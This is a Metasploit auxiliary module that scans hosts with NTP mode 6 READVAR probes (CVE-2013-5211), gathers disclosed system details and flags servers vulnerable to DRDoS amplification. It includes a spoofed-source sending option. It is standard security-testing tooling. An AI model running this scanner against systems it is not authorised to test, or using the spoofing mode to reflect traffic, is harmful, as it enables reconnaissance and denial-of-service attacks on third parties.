##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::UDPScanner
  include Msf::Auxiliary::NTP
  include Msf::Auxiliary::DRDoS

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NTP Clock Variables Disclosure',
      'Description'    => %q(
        This module reads the system internal NTP variables. These variables contain
        potentially sensitive information, such as the NTP software version, operating
        system version, peers, and more.
      ),
      'Author'         =>
        [
          'Ewerson Guimaraes(Crash) <crash[at]dclabs.com.br>', # original Metasploit module
          'Jon Hart <jon_hart[at]rapid7.com>' # UDPScanner version for faster scans
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2013-5211'], # see also scanner/ntp/ntp_monlist.rb
          [ 'URL', 'http://www.rapid7.com/vulndb/lookup/ntp-clock-variables-disclosure' ]
        ]
      )
    )
  end

  def scanner_process(data, shost, _sport)
    @results[shost] ||= []
    @results[shost] << Rex::Proto::NTP::NTPControl.new.read(data)
  end

  def scan_host(ip)
    if spoofed?
      datastore['ScannerRecvWindow'] = 0
      scanner_spoof_send(@probe, ip, datastore['RPORT'], datastore['SRCIP'], datastore['NUM_REQUESTS'])
    else
      scanner_send(@probe, ip, datastore['RPORT'])
    end
  end

  def scanner_prescan(batch)
    @results = {}
    print_status("Sending NTP v2 READVAR probes to #{batch[0]}->#{batch[-1]} (#{batch.length} hosts)")
    @probe = Rex::Proto::NTP::NTPControl.new
    @probe.version = datastore['VERSION']
    @probe.operation = 2
  end

  def scanner_postscan(_batch)
    @results.keys.each do |k|
      # TODO: check to see if any of the responses are actually NTP before reporting
      report_service(
        host: k,
        proto: 'udp',
        port: rport,
        name: 'ntp',
        info: @results[k].map { |r| r.payload.slice(0,r.payload_size) }.join.inspect
      )

      peer = "#{k}:#{rport}"
      response_map = { @probe => @results[k] }
      vulnerable, proof = prove_amplification(response_map)
      what = 'NTP Mode 6 READVAR DRDoS'
      if vulnerable
        print_good("#{peer} - Vulnerable to #{what}: #{proof}")
        report_vuln(
          host: k,
          port: rport,
          proto: 'udp',
          name: what,
          refs: references
        )
      else
        vprint_status("#{peer} - Not vulnerable to #{what}: #{proof}")
      end
    end
  end
end
